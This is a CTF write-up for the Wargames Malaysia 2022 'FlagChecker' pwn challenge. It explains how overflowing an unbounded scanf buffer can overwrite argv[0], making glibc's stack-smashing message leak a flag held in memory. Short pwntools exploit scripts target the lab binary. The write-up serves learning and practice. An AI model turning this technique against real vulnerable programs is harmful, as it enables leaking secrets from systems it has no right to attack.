---
title: Flag Checker (pwn) -- War Games Malaysia
date: 2022-12-31T05:59:12Z
draft: false
description: pwn challenge from war games malaysia
tocOpen: true
---

# FlagChecker

*pwn challenge from wgmy2022*

```
FlagChecker.zip
├── bin
│   ├── flag_checker
│   └── flag.txt
├── ctf.xinetd
├── docker-compose.yml
├── Dockerfile
└── start.sh
```

## Setup

Since we are provided with the Dockerfile, we can start by setting up our environment (extracting the LIBC and LD) to mimic the environment of the server.

Upon setting up our docker, we can spawn a shell as shown below
```
❯ docker exec -it wgmy-flag_checker-1 /bin/bash

root@ef917d02df99:/home/ctf# ldd flag_checker # show the dependencies
        linux-vdso.so.1 =>  (0x00007ffe15bfe000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa350800000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa350c00000)
root@ef917d02df99:/home/ctf# ls -al /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6
lrwxrwxrwx 1 root root 32 Apr 21  2021 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.23.so
lrwxrwxrwx 1 root root 12 Apr 21  2021 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.23.so

```

As we can see, the binary is dynamically compiled with the libc and ld at the paths shown above. We can copy out both the libc and ld into our host.

```
❯  docker cp wgmy-flag_checker-1:/lib/x86_64-linux-gnu/ld-2.23.so .
❯  docker cp wgmy-flag_checker-1:/lib/x86_64-linux-gnu/libc-2.23.so .
```

Finally, we can link the libc and the ld to our binary in our host, which would cause the environment to be identical to that of the remote server (which we ultimately need to exploit to get the flag).

```
❯ ldd flag_checker
        linux-vdso.so.1 (0x00007fffafdfd000)
        ./libc-2.23.so (0x00007fa3afa00000)
        ./ld-2.23.so => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa3afe61000)

❯ patchelf --replace-needed libc.so.6 ./libc-2.23.so --set-interpreter ./ld-2.23.so  ./flag_checker
```

Voila! Our setup is done.

*note: i choose to copy my binary out instead of directly using the binary in the docker because it is easier to pwn on my local machine due to tools and what not*

## Looking for our vulnerability

If we decompile the program, we see that it is a really simple program:

```c
char flag[64];

int main()
{
  FILE *stream;
  char input[72];

  stream = fopen("flag.txt", "r");
  fgets(flag, 64, stream);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("Flag Checker");
  puts("------------");
  printf("Enter flag: ");
  scanf("%s", input);
  if ( !strcmp(flag, input) )
    puts("Correct flag!");
  else
    puts("Wrong flag!");
  return 0;
}
```

It simply reads the flag into the memory *(more specifically, the .bss segment)*, and takes in an input.

There is an obvious buffer overflow --- we are not limiting the size of our input via scanf. At first glance, this challenge may suddenly seem trivial due to the presence of an easy buffer overflow and a flag in the memory.

However, if we look at the security of the binary,

```sh
❯ checksec flag_checker
[*] '/home/elmo/wgmy/bin/flag_checker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

We see that the stack canary protection is enabled. This renders our stack-based buffer overflow almost useless, since we are guaranteed to overwrite the canary as soon as we try to overflow our buffer.

Additionally, there is no obvious way to leak the canary in the program. This makes the challenge a lot more complex.

Naturally, if we try to overflow the binary with a large buffer,

```c
❯ ./flag_checker
Flag Checker
------------
Enter flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong flag!
*** stack smashing detected ***: ./flag_checker terminated
Aborted (core dumped)
```

our program will crash with a "stack smashing detected" message. This is expected.

However, if we increase the size of our overflow,

```c
❯ ./flag_checker
Flag Checker
------------
Enter flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong flag!
Segmentation fault (core dumped)
```

We see that there is a segmentation fault instead of the expected "stack smashing detected".

If we replicate the crash in GDB, 

![](https://i.imgur.com/EcNWYyo.png)

we can see that our program crashes at the `getenv` symbol. Additionally, it crashes due to it trying to dereference our buffer.

If we look at the stack trace, we can see that the program flowed like this

```
main -> __stack_chk_fail --> __fortify_fail --> ? --> getenv()
```

Let's look at the `__fortify_fail` source code.

```c

__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
		    msg, __libc_argv[0] ?: "<unknown>");
}

```

As we can see, `__fortify_fail` is simply a trampoline to `__libc_message_`. It calls `__libc_message` with 4 arguments. 

The most important argument is the 4th argument, which is `__libc_argv[0]`. This is usually just the program name, and is stored right below the `main` function stack frame. *(we will just keep this at the back of our head for now)*

Now if we look inside `__libc_message`,

```c
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
    
  // ...
    
  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
    
  // ...
    
  if (on_2 == NULL || *on_2 == '\0')
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);

  if (fd == -1)
    fd = STDERR_FILENO;

  // ...

  // output error message
  written = WRITEV_FOR_FATAL (fd, iov, nlist, total);

  // ...
    
  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}
```


`__libc_message` tries to calls `getenv("LIBC_FATAL_STDERR")` to look for the `LIBC_FATAL_STDERR` environment variable and determine if the error output should be outputted to stdout, or not. 

Otherwise, it will try to open a new file descriptor, and output the error message to that file descriptor before aborting.

Our program crashes on the call to `getenv`, which is called my `__libc_secure_getenv`. This is because when we increased the size of our overflow, we actually overflowed the entire environment variable block *(which is usually right below our main stack frame)*.

> the environmental variable block simply contains an array of pointers to strings that correspond with environmental variable and its value

This results in a segmentation fault when `getenv` tries to look into our environment variables to find `LIBC_FATAL_STDERR`.

<center><em>before increasing our overflow size -- overflow followed by enviromental variable block</em></center>

![](https://i.imgur.com/ZZEPrO7.png)


<center><em>after increasing our overflow size -- environmental variable block gone</em></center>

![](https://i.imgur.com/rA40LSM.png)

By now, you may be wondering: how does all of this help me to get the flag? If we look at the error message again:

```
*** stack smashing detected ***: ./flag_checker terminated
```

We can see that it is actually made out of 3 parts, `"*** %s ***: %s terminated"`, `"stack smashing detected"` and `"./flag_checker"`. All of which are actually the arguments provided to the `__libc_message` argument. 

```python
# output from GDB
__libc_message (
   $rdi = 0x0000000000000001,
   $rsi = 0x00007ffff798f59f → "*** %s ***: %s terminated\n",
   $rdx = 0x00007ffff798f581 → "stack smashing detected",
   $rcx = 0x00007fffffffc473 → "/home/elmo/wgmy/bin/flag_checker"
)
```

Our exploit methodology is as such --- overflow the program such that

1. `__libc_argv[0]` points to our flag *(argv is stored right before our environment variable block)*
2. Program does not crash before it prints the output message.


## Writing the exploit


`getenv` will iterate through the array of environment variable pointer to look for the name.

If we look at the source code:

```c
char * getenv (const char *name)
{

  if (__environ == NULL || name[0] == '\0')
    return NULL;
  // ...
}
```

Given that we can write whatever we want to the environment variable pointer, we want `getenv` to return without crashing.

Based on the source code above, we can simply set the first entry of the environment array to NULL.

If we look at this picture of the stack again

![](https://i.imgur.com/ZZEPrO7.png)

We see that our input starts at `$rsp+0x120`, and our argv[0] is at `$rsp+0x258` and our environment block starts at `$rsp+0x268`.

Ideally, we want `argv[0] == pointer_to_flag` and `__environ == NULL`

Doing the math, `0x268 - 0x120 = 328 = offset to environment block` and `0x258 - 0x120 = 312 = argv[0]`.

We can write our exploit script as follows.

```python
from pwn import *

elf = ELF("./flag_checker")
p = process("./flag_checker")

p.sendline(fit({312: p64(elf.sym.flag), # argv[0] == flag
                328: p64(0)}))          # __environ == NULL

p.interactive()
```

which would yield us the flag

```sh
❯ python3 xpl.py

[+] Starting local process './flag_checker': pid 423423
[*] Switching to interactive mode
Flag Checker
------------
Enter flag: Wrong flag!
*** stack smashing detected ***: wgmy{test_flag} terminated

```

## Hindsight

After the CTF *(and after writing this post)*, I realised that there was no need to look into the `getenv` function, since you can just overflow enough to overflow argv[0] but not overflow the environment block.

```python
from pwn import *

elf = ELF("./flag_checker")
p = process("./flag_checker")

p.sendline(fit({312: p64(elf.sym.flag)})) # argv[0] == flag
                #328: p64(0)}))           # unnecessary

p.interactive()
```
